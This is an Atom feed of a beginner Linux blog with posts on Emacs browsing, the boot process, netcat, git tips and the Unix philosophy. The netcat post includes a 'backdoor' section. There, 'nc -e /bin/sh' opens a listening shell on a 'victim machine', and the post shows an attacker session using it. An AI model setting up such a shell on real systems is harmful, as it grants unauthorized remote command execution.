<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: Linux Beginners | Beat of The Geek]]></title>
  <link href="http://\.github.io/\/github/blog/categories/linux-beginners/atom.xml" rel="self"/>
  <link href="http://\.github.io/\/github/"/>
  <updated>2014-10-20T10:06:05+05:30</updated>
  <id>http://\.github.io/\/github/</id>
  <author>
    <name><![CDATA[Charanjit Singh]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[The awesome of web browsing with Emacs]]></title>
    <link href="http://\.github.io/\/github/2014/02/the-awesome-of-web-browsing-with-emacs.html"/>
    <updated>2014-02-19T00:00:00+05:30</updated>
    <id>http://\.github.io/\/github/2014/02/the-awesome-of-web-browsing-with-emacs</id>
    <content type="html"><![CDATA[<div class='post'>
<div dir="ltr" style="text-align: left;" trbidi="on">Emacs is awesome. There is a kinda steep learning curve for new comers, which I think is the reason it's not popular among most new-techies. But once you've got over that, it's all hugs and kisses. <br /><br />Emacs is addictive. You get addicted to it. Addicted to its power, to its flexibility, and if nothing else, it's keyboard shortcuts. This addiction result in browser extensions like <a href="https://addons.mozilla.org/en-US/firefox/addon/firemacs/" target="_blank">firemacs</a> ), (you should definitely try it if you are an emacs user), which adds emacs shortcuts to Firefox (another awesome piece of technology).<br /><br /><!-- more --><br /><br />But there is another level of addiction. When you want to do everything you do on computer from within Emacs. And Emacs won't complaint, or get in your way. It's a freaking <a href="http://c2.com/cgi/wiki?EmacsAsOperatingSystem" target="_blank">operating system in itself</a>. People are <a href="http://www.informatimago.com/linux/emacs-on-user-mode-linux.html" target="_blank">doing crazy things with it</a>. <br /><br />I am here to share my experience of using Emacs as my primary web browser for quite some time now.<br /><br />For about a month, I am in a situation in which I am on very expensive (for my unemployed soul) Internet connection, and can't afford to waste any bandwidth. Every MB matters. Firefox was consuming a lot of bandwidth for downloading all those images, js, and css I don't care about most of the time. All I wanted from Internet was text. So I turned towards command line web-browsers. By instinct I looked for <a href="http://www.google.com/search?btnI=I%%27m+Feeling+Lucky&amp;ie=UTF-8&amp;oe=UTF-8&amp;q=Emacs+as+a+web+browser" target="_blank">options in Emacs as a web browser</a>. There are many. I chose <a href="http://emacs-w3m.namazu.org/" target="_blank">emacs-w3m</a>.<br /><br />Now I am fond of it. Many good things I've got out of using emacs as my web browser.<br /><br /><h3 style="text-align: left;">It feels good</h3><div style="text-align: left;">It feels great actually. I don't know what it is there in it, but using Emacs feels like being at home. An easy and relaxed feeling. I am a knowledge hungry maniac, so the ability to browser information, and summarize and store it from within the same familiar ecosystem added another level of ease. This kind of mental ease really matter when throw all sort of <a href="https://github.com/gulpjs/gulp" target="_blank">new technologies</a> on yourself everyday.</div><div style="text-align: left;"><br /></div><h3 style="text-align: left;">Distraction free</h3><div style="text-align: left;">I feel it much more focused when reading text in Emacs. I realized it first time while reading emacs-lisp-intro, <a href="http://channikhabra.github.io/2013/10/11/the-most-beautiful-tutorial/" target="_blank">the most beautiful tutorial</a> ever imo. I think there are two main reason for this. </div><div style="text-align: left;"><br />First is the absence of all those fancy graphics (images, fonts, styles etc) that you awe on modern web pages. If you are actually after the information, believe me you won't miss an ounce of them. </div><div style="text-align: left;"><br />Second reason I think is the habit. My mind is trained to focus on code (that's what we use Emacs for, remember?) in Emacs. It might be the environment that increase the focus level by magnitude when am reading something inside Emacs. </div><div style="text-align: left;"><br /></div><h3 style="text-align: left;">Ad blocking by default</h3><div style="text-align: left;">That's obvious. No Javascript, no images, No ads. No need to install ad-block plus and feel bad for publishers. Please note that this certainly does not mean that you can't view images in Emacs. It's an opt-in option in emacs-w3m (which of course can be toggled globally to display images by default).</div><div style="text-align: left;"><br /></div><h3 style="text-align: left;">It made me a Better Blogger</h3><div style="text-align: left;">I like writing. I have been running this blog since 2011, but wrote like 10 posts in 2 years. It started changing when I started using org-mode in Emacs for taking notes about literally everything. And web browsing from within Emacs made it even easier to write. For a pro-level procrastinator like me, even a press of `alt+Tab` is enough of an excuse to not write. </div><div style="text-align: left;"><br />I believe it is not pressing `alt+Tab`. It's change of context that happen when switching windows (Firefox to Emacs). Many things flush out of head when I actually reach to Emacs from Firefox. It got resolved with using Emacs as web browser. </div><div style="text-align: left;"><br />It also boosted my habit of note making. A simple `C-x 3` and `C-x o` made a lot of difference.</div><div style="text-align: left;"><br />Actually I believe it's <a href="http://orgmode.org/" target="_blank">org-mode</a> which is responsible for my better blogging habits. Earlier I had to sit down and start writing a post; now I switch to my notes.org and search for which of the org nodes can be turned into blog posts. emacs-w3m sure increased the size of my notes file though.</div><div style="text-align: left;">Please also read about <a href="http://www.beatofthegeek.com/2014/02/my-setup-for-using-emacs-as-web-browser.html" target="_blank">my setup for using emacs as web browser</a>.</div></div></div>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA["To know me better, try walk in my boots", said GNU/Linux]]></title>
    <link href="http://\.github.io/\/github/2014/01/linux-boot-process-real-quick-walkthrough.html"/>
    <updated>2014-01-12T00:00:00+05:30</updated>
    <id>http://\.github.io/\/github/2014/01/linux-boot-process-real-quick-walkthrough</id>
    <content type="html"><![CDATA[<div class='post'>
<div dir="ltr" style="text-align: left;" trbidi="on"><h2 style="text-align: left;">A quick go through to the GNU/Linux boot process</h2>This post talks (quickly) about how a typical Linux (PC) system boots. I'll try avoiding much technical terms. It'll be a quick walk without diving much deeper.<br /><br />The booting process of a system involves several steps. <br />When the computer first powers up, the code in its ROM is executed. This code generally called the firmware has some knowledge of the system hardware. On PCs this initial boot code is generally called the <b>BIOS (Basic Input/Output System)</b>. A PC can have several BIOS levels for machine itself, graphic cards, network cards etc. In the context of booting, the BIOS generally perform two operations:<br /><ul style="text-align: left;"><li>It figures out which device to boot from</li><li>And loads a program from the bootable sector from bootable device which tell the secondary boot loader to load<!-- more --></li></ul><h4 style="text-align: left;">The MBR loading process then takes place. </h4>MBR is the boot sector on hard disks. <b>MBR(Master Boot recorder)</b> is the first sector on the disk which have details about<br /><ul style="text-align: left;"><li>Primary boot loader code(This is of 446 Bytes)<br />The first 446 bytes of MBR contain the code that locates the partition to boot from. The rest of booting process takes place from that partition. This partition contains a software program for booting the system called the ‘bootloader’.</li><li>Partition table information(64 Bytes)<br />MBR contains 64 bytes of data which stores Partition table information such as <br />- what is the start and end of each partition<br />- size of partition<br />- type of partition(Whether it's a primary or extended etc)<br />It requires 16 Bytes of space for one partition. So at most we get 4 primary partitions.</li><li>Magic number(2 Bytes)<br />The magic number service as validation check for MBR. If MBR gets corrupted this magic number is used to retrieve it.</li></ul><h4 style="text-align: left;">GRUB loading</h4><div style="text-align: left;"><b>GRand Unified Bootloader</b> is the boot loader for most Linux distributions. Its job is to load a kernel from a pre-prepared list of kernels with options specified. The GRUB has two versions<br />- GRUB legacy<br />- GRUB 2</div><div style="text-align: left;"><br />GRUB works in stages.<br />Stage 1 is located in the MBR and mainly points to Stage 2, since the MBR is too small to contain all of the needed data.<br />Stage 2 points to its configuration file, which contains all of the complex user interface and options we are normally familiar with when talking about GRUB. Stage 2 can be located anywhere on the disk. If Stage 2 cannot find its configuration table, GRUB will cease the boot sequence and present the user with a command line for manual configuration.<br />Stage 1.5 also exists and might be used if the boot information is small enough to fit in the area immediately after MBR.<br /><br />GRUB 2 has replaced the first version of GRUB which is hence now called GRUB Legacy. GRUB 2 has better portability and modularity, supports non-ASCII characters, dynamic loading of modules, real memory management, and more.&nbsp;</div><h4 style="text-align: left;">Kernel initialization</h4><div style="text-align: left;">The kernel itself is a program which on Linux is usually located as some variant of '/boot/vmlinuz'. On my system it is </div><blockquote class="tr_bq">/boot/vmlinuz-linux</blockquote><div style="text-align: left;">After the kernel is loaded it probes the system for how much RAM is available. It reserves some memory for itself for its own statically sized data structures. Then the kernel probes for what hardware is present and for loading device drivers.&nbsp; Mostly kernel loads device drivers as independent kernel modules so a small Linux kernel can support a large number of hardware devices. Different GNU/Linux distributions can come with different driver modules bundled with the kernel.<br />After basic initialization the kernel creates several "spontaneous" processes. They are called spontaneous because they are not started in user space with regular 'fork'&nbsp; mechanism. we can see the processes with </div><blockquote class="tr_bq">ps -A</blockquote><div style="text-align: left;">Most system started process have low PIDs. Process with PID 0 is the init system.</div><h4 style="text-align: left;">Init process</h4><div style="text-align: left;">init is the first process to run and always has PID 1. Different systems may have different implementations of init e.g last time I used Ubuntu, it was using 'upstart'. We can check the init system on our machine with</div><blockquote>=&gt; ps -A | head -n 2 <br />=&gt; PID TTY&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; TIME CMD<br />&nbsp;&nbsp;&nbsp; 1&nbsp; ?&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 00:00:00 systemd</blockquote><div style="text-align: left;">Init script is generally '/sbin/init' which can be a symbolic link to the init daemon</div><blockquote class="tr_bq">=&gt; file /sbin/init<br />=&gt; /sbin/init: symbolic link to `../usr/lib/systemd/systemd'</blockquote><div style="text-align: left;">Some commonly performed tasks by these scripts are<br />- settings the name of the computer<br />- setting the time zone<br />- checking disks with 'fsck'<br />- mounting the system's disks<br />- removing old files from '/tmp'<br />- configuring network interfaces<br />- starting up daemons and network services<br />&nbsp;</div><div style="text-align: left;">init have a concept of run&nbsp; levels. Different init systems may use different terms for run levels (e.g systemd call 'em targets). But the purpose is similar in most cases.</div><div style="text-align: left;">init defines at least seven run levels each of which represents a particular complement of services that the system should be running. Exact definitions may vary among systems but general points are<br />- at level 0, system is completely shut down<br />- level 1 represents single user mode<br />- level 2 to 5 include support for networking<br />- level 6 is 'reboot' <br />The number of levels on different systems vary, as their names. The system is now booted, and proceeds depending on the run level it's been set for.</div><div style="text-align: left;"></div><div style="text-align: left;">You can get more information about the <a href="http://www.tldp.org/LDP/sag/html/run-levels-intro.html#RUN-LEVELS-TABLE" target="_blank">run levels here</a>. For an excerpt</div><div style="text-align: left;"><span style="font-family: Times,&quot;Times New Roman&quot;,serif;"><br />0 - Halt the system.</span></div><div style="text-align: left;"><span style="font-family: Times,&quot;Times New Roman&quot;,serif;">1 - Single-user mode (for special administration).</span></div><div style="text-align: left;"><span style="font-family: Times,&quot;Times New Roman&quot;,serif;">2 - Local Multiuser with Networking but without network service (like NFS)</span></div><div style="text-align: left;"><span style="font-family: Times,&quot;Times New Roman&quot;,serif;">3 - Full Multiuser with Networking</span></div><div style="text-align: left;"><span style="font-family: Times,&quot;Times New Roman&quot;,serif;">4 - Not Used</span></div><div style="text-align: left;"><span style="font-family: Times,&quot;Times New Roman&quot;,serif;">5 - Full Multiuser with Networking and X Windows(GUI)</span></div><div style="text-align: left;"><span style="font-family: Times,&quot;Times New Roman&quot;,serif;">6 - Reboot.</span></div></div></div>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[5 cool things to do with `netcat']]></title>
    <link href="http://\.github.io/\/github/2014/01/5-cool-things-to-do-with-netcat.html"/>
    <updated>2014-01-09T00:00:00+05:30</updated>
    <id>http://\.github.io/\/github/2014/01/5-cool-things-to-do-with-netcat</id>
    <content type="html"><![CDATA[<div class='post'>
<div dir="ltr" style="text-align: left;" trbidi="on"><div class="separator" style="clear: both; text-align: center;"><a href="http://4.bp.blogspot.com/-RJa66jJ6HHI/Us41fwVnz9I/AAAAAAAAAlA/WYM1w7SnfGE/s1600/46.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="236" src="http://4.bp.blogspot.com/-RJa66jJ6HHI/Us41fwVnz9I/AAAAAAAAAlA/WYM1w7SnfGE/s1600/46.png" width="400" /></a></div>I heard somewhere about 'netcat' being the swiss-army-knife for networking. Looking through its man pages I tried many commands as I could understand them, but still remained unimpressed. But so many wise people calling netcat 'the awesome' can't be wrong, right! So I went through lengths and surfed&nbsp; the Internets, grep'd some ebooks on networking, re-read its man pages and forced myself to get impressed. <br />Here is a list of cool things I could figure out to be done with netcat. I am sure there are more my puny brain couldn't discover. Hugs and kisses for all (females) who will tell 'em in comments.<br /><!-- more --><br /><h2 style="text-align: left;">Banner grabbing / Displaying user-agent for the request</h2><blockquote class="tr_bq">&nbsp;netcat -lp 6969</blockquote>So basically netcat is 'cat' for the net(work). It directly reads and writes data over the network. Sounds good for peeking at 'HTTP' headers? To me at least. This is the only thing I use netcat for on daily basis. Many of my tasks involve making crawlers, and netcat is the first tool I use for exploring how my crawlers behave to servers.<br />Most of the times I am interested in inspecting the 'User Agent' header, but above command dumps a lot more information about the HTTP headers.<br />Here's an excerpt:<br /><blockquote class="tr_bq">GET / HTTP/1.1<br />Host: 127.0.0.1:9999<br />Accept-Language: en<br />Accept-Encoding: x-gzip,gzip,deflate<br />Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br />User-Agent: Scrapy/0.20.0 (+http://scrapy.org)</blockquote><h2 style="text-align: left;">Using netcat as a port scanner</h2><blockquote class="tr_bq">nc -zp 9090 localhost 8000-9000 -v</blockquote>Netcat can help in finding out the open ports on our machine. Yes and yes. There are better tools available for this job and they are more efficient. I can't guess why to nc for this. May be because it can be used like this, or because netcat is installed by default on most machines and nmap is not.<br />Here's an excerpt when a 'twisted' http server was running on my machine.<br /><blockquote class="tr_bq">localhost [127.0.0.1] 8080 (http-alt) open</blockquote><h2>Netcat as a simple local network backdoor</h2>This is another one of my favorites. Making backdoors was never this simple. Although this only worked on local network, but it's kind of cool. I think with little more effort this can be made to work from outside the LAN as well, may with tunneling (nc -L) or something. I am too tired to do any more research. Please enlighten me if you can do it. Here's how I did it on my LAN.<br /><h4 style="text-align: left;">On victim machine run</h4><blockquote class="tr_bq">&nbsp;nc -e "/bin/sh" 127.0.0.1 -lp 8080</blockquote>'nc -e' executes any program on the local machine. I tried running python and ruby scripts, and even installing software with 'pacman' by running similar command on one machine and then making a request with 'curl' and even with firefox from other machine.<br /><h4 style="text-align: left;">On attacker machine send commands with</h4><blockquote class="tr_bq">nc <command></command><command></command><br />e.g nc ls -a</blockquote>This will run a session in which a command is executed and its stdout shown. Here's an excerpt from one of those I tried.<br /><br /><blockquote class="tr_bq">nc 127.0.0.1 8080</blockquote><blockquote>echo $SHELL<br />/bin/zsh<br />whoami<br />channi<br />pwd&nbsp; <br />/home/channi<br />ls /media/<br />E<br />F<br />cd /media/E<br />pwd<br />/media/E<br />ls<br />e Books<br />Games<br />Images<br />Movies<br />Music</blockquote><h2 style="text-align: left;">Using netcat as a single request web server</h2><blockquote class="tr_bq">{ echo -ne "HTTP/1.0 200 OK\r\nContent-Length: $(wc -c <some -l="" -p="" .file="" 8080="" br="" cat="" n="" nc="" r="" some.file=""></some></blockquote>You don't need to be a $BASH wiz to understand this one. It simply outputs the basic HTTP headers and calculated content length of a file to the netcat which then listens on port 8080. It gets served to whoever reaches localhost:8080 first. Yup! First come first serve. This server works for a single request only, and I din't try it over the Internet.&nbsp; <br /><h2 style="text-align: left;">Using netcat as a listener</h2><blockquote class="tr_bq">cat afile.txt | nc 127.0.0.1 9999<br />nc -l 127.0.0.1 9999 &gt; log.txt</blockquote>Netcat can be used as a listener (as it is being used in first point) and stuff can be sent over network as in commands above. The second command must be run on a recipient machine and first from sender machine. A file can be sent this way. <br /><br />Yes I din't properly research for this post. I don't like writing half-assed posts but I have to stay with my new-year resolution of writing a-post-a-day. All the enlightened souls please bless me with your wisdom in comments. Specially anything about making nc persist multiple requests without scripting it with bash, python or anything.</div></div>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[5 things I frequently do and forget with git]]></title>
    <link href="http://\.github.io/\/github/2014/01/5-things-i-frequently-do-and-forget.html"/>
    <updated>2014-01-08T00:00:00+05:30</updated>
    <id>http://\.github.io/\/github/2014/01/5-things-i-frequently-do-and-forget</id>
    <content type="html"><![CDATA[<div class='post'>
<div dir="ltr" style="text-align: left;" trbidi="on">Here are few things I used to do a lot in my starting days with git and then forgot to re-search them when needed next time. These tips are from my notes. <br /><br /><h3 style="text-align: left;">How to undo the last Git commit?</h3>There are two scenarios in this case, and hence two ways to achieve our goal.<br /><h4 style="text-align: left;">Hard Reset - Completely undo the last commit and all the changes it made.</h4><blockquote class="tr_bq">git reset --hard HEAD~1</blockquote>Imagine the state of the tree is as following:<br /><br /><blockquote>&nbsp;&nbsp; (F)<br />A-B-C<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ↑<br />&nbsp; master</blockquote><br /><!-- more --><br /><br />where (F) is the current state of files and 'C' is the commit we want to undo. The above command completely removes the last commit along with all the changes involved in the commit. The new state of the tree is like this:<br /><br /><blockquote class="tr_bq">&nbsp;(F)<br />A-B<br />&nbsp;&nbsp;&nbsp; ↑<br />master</blockquote><br /><br /><blockquote class="tr_bq"><b>What is HEAD?</b><br />We can think of the HEAD as the "current branch". HEAD is basically a pointer which points to the latest commit. When we switch branches with git checkout, the HEAD revision changes to point to the tip of the new branch.</blockquote><blockquote class="tr_bq"><b>What is HEAD~1?</b><br />It's kind of complicated to explain HEAD~1 without explaining HEAD^1.<br />HEAD^1&nbsp; means the first parent of the commit object. ^<n> means the <n>th parent.<br />HEAD~1 means the commit object that is the first generation grand-parent of the named commit object, following only the first parents. e.g <rev>~3 is equivalent to <rev>^^^ which is equivalent to <rev>^1^1^1.</rev></rev></rev></n></n></blockquote><h4 style="text-align: left;">Undo the commit but keep the changes</h4><blockquote class="tr_bq">git reset HEAD~1</blockquote>If we want to undo the last commit for some reason (like if we entered the wrong commit message or the commit was incomplete), we can use a soft reset on HEAD.<br />In this case, the tree structure changes to something like:<br /><br /><blockquote>&nbsp;&nbsp; (F)<br />A-B-C<br />&nbsp;&nbsp; ↑<br />master</blockquote><br /><b>What's happening?</b><br />In both cases, HEAD is just a pointer to the latest commit. When we do a git reset HEAD~1, we tell Git to move the HEAD pointer back one commit. But (unless we use --hard) we leave your files as they were. So now git status shows the changes you had checked into C. You haven't lost a thing!<br /><h3 style="text-align: left;">How to change the commit message of last commit</h3><blockquote class="tr_bq">git reset --soft HEAD~1</blockquote>Using this command we undo the last commit but keep the files as well as the index untouched. This means we can just recommit with no extra effort as a new commit with a new commit message.<br /><br /><b>What's happening here?</b><br />Same as first point. But it leaves the files as well as the index unchanged, so we just need to 'commit' again with a new commit message.<br /><h3 style="text-align: left;">How to get a commit back after 'reset --hard'</h3>In the first point, we undid the previous commit permanently(?). Sometimes (read often) it happens that we need the destroyed commit back. Following commands can be used to resurrect the destroyed commit.<br /><blockquote class="tr_bq">git reflog </blockquote>This command shows a list of partial commit shas. We need to choose the commit we want to restore from this list and use following command.<br /><blockquote class="tr_bq">git checkout -b someNewBranchName shaOfDestroyedCommit</blockquote>This will create a new branch and restore the destroyed commit in it, which we can re-merge as required.<br /><br /><b>What's happening here?</b><br />Commits don't actually get destroyed in git for about 90 days. So usually we can go back and restore commits with method explained above.<br /><h3 style="text-align: left;">How to remove a git submodule?</h3><blockquote class="tr_bq">Git submodule?</blockquote>Submodules allow foreign repositories to be embedded within a dedicated subdirectory of the source tree, always pointed at a particular commit. Submodules are meant for different projects you would like to make part of your source tree, while the history of the two projects still stays completely independent and you cannot modify the contents of the submodule from within the main project.<br /><h4 style="text-align: left;">Removing a git submodule</h4>Git submodules can simply be removed with 'git rm', but that keeps the submodule entry intact in the .git/config and .gitmodules. There is actually an easier way to remove submodules with a single command.<br /><blockquote class="tr_bq">git submodule deinit <submodule name=""><br /></submodule></blockquote>This is in comprehension to 'git submodule init' command and does all the submodule removal work itself.<br /><h3 style="text-align: left;">How to delete a remote git branch?</h3>&nbsp;This one is easy. We just need one command to delete a remote branch.<br /><blockquote class="tr_bq">git push origin --delete <branchname><br /></branchname></blockquote>To remove a local branch, we can of course use<br /><blockquote class="tr_bq">git branch -d <localbranch><br /></localbranch></blockquote><br /></div></div>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Yet another post about the unix philosophy]]></title>
    <link href="http://\.github.io/\/github/2013/12/yet-another-post-about-unix-philosophy.html"/>
    <updated>2013-12-22T00:00:00+05:30</updated>
    <id>http://\.github.io/\/github/2013/12/yet-another-post-about-unix-philosophy</id>
    <content type="html"><![CDATA[<div class='post'>
<div dir="ltr" style="text-align: left;" trbidi="on"><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://izquotes.com/quotes-pictures/quote-the-unix-philosophy-basically-involves-giving-you-just-enough-rope-to-hang-yourself-and-then-a-anonymous-293194.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="150" src="http://izquotes.com/quotes-pictures/quote-the-unix-philosophy-basically-involves-giving-you-just-enough-rope-to-hang-yourself-and-then-a-anonymous-293194.jpg" width="320" /></a></div>I have a recently started a minor Linux Users Group with some people in my locality. One question that I've been answering frequently is 'what is this "unix philosophy"?<br />Am writing this post as a quick answer for this question.<br /><br /><b>Some history of the unix philosophy</b><br /><br />Unix philosophy or the unix tools philosophy emerged when the UNIX operating system was created. Or to be more precise, when the pipes '|' were invented. The pipes allow output from one command to be sent to another command as input.<br />e.g <br /><blockquote class="tr_bq">ps -A | grep firefox</blockquote>The output from the ps command, list of all running applications is passed to the 'grep' utility which searches for the line having the word 'firefox', and prints it. Pipes are really handy. Really.<br /><br />The philosophy lead by this invention was to create small tools which would do a particular job&nbsp; instead of creating big programs that do many things.<br />For example tools like grep, or wc. They exist for one and only one task (searching and counting).<br /><br />These small tools could then be used together with the help of pipes to accomplish more complex tasks.<br /><br />It was revolutionary. This philosophy avoided programmers from re-creating small subsystems of their software which could now be replaced by a small tool invented by someone else.<br /><br />So this why <b>the philosophy says</b><br /><blockquote class="tr_bq">'Do one thing, and do it perfectly well'</blockquote></div></div>

]]></content>
  </entry>
  
</feed>
